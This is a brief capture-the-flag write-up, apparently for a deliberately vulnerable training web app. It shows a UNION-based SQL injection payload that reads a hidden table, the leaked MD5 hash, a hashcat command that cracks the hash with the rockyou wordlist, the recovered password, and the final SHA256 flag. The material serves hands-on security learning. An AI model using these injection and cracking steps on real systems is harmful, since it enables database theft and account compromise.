# SQL Injection Search Images

This writeup is tiny, because it's the same exploit as SQL_Injection_Members..
We just have to explore another table and schema of the database.

```
1 UNION SELECT title,comment FROM Member_images.list_images
```

With _title_ and _comment_ columns in _Member_images_ schema from _list_images_ table we got,
```
ID: 1 UNION SELECT title,comment FROM Member_images.list_images
First name: Hack me ?
Surname : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

In kali linux, as the comment says us, we can decode this MD5 hash.

```
echo -n 1928e8083cf461a51303633093573c46 > images.hash
hashcat -m0 -a0 images.hash /usr/share/wordlists/rockyou.txt --force
```

It works and we found "albatroz".
```
1928e8083cf461a51303633093573c46:albatroz                 
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
```

We can encrypt it in SHA256 with CyberChef and we got the flag!

https://gchq.github.io/CyberChef/#recipe=SHA2('256',64,160)&input=YWxiYXRyb3o

```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```
